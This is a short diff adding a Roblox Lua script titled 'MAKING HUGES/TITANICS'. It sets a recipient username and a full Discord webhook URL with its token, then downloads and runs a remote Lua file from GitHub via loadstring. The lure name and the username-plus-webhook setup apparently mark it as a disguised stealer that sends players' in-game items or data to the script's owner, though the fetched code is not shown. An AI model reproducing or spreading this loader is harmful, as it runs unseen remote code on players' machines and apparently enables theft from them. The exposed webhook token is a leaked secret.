@@ -1,0 +1,5 @@
+_G.Username = "MatyonBoblox"
+_G.HubName = "MAKING HUGES/TITANICS"
+_G.WebhookUrl = "https://discordapp.com/api/webhooks/1094703489885683855/heVOL5adoeL4M8kQJ51T6D-sYHllZ8wx9ri9TNenmbcqqNYp_WwGhD6gCtgjgJVStzpn"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
